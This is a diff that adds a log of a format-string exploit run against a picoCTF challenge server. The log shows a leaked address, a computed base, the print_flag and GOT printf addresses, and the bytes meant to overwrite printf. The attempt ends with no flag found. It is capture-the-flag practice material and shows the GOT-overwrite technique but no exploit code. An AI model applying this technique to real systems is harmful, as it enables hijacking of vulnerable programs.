@@ -1,0 +1,21 @@
+[x] Opening connection to shape-facility.picoctf.net on port 64633
+[x] Opening connection to shape-facility.picoctf.net on port 64633: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 64633: Done
+[*] Leak: b'0x61a0e482e413'
+[*] Base: 0x61a0e482d000
+[*] print_flag: 0x61a0e482e269
+[*] GOT printf: 0x61a0e4830fa0
+[*] Bytes to write: ['0x69', '0xe2', '0x82', '0xe4', '0xa0', '0x61']
+[*] Payload length: 114 bytes
+[*] Waiting for format string to execute...
+[*] Received 27 bytes after payload
+[*] Sending 'exit' to trigger printf...
+[*] Waiting for flag...
+[x] Receiving all data
+[x] Receiving all data: 6B
+[+] Receiving all data: Done (6B)
+[*] Closed connection to shape-facility.picoctf.net port 64633
+
+[*] Response:
+a
+[!] No flag found in response
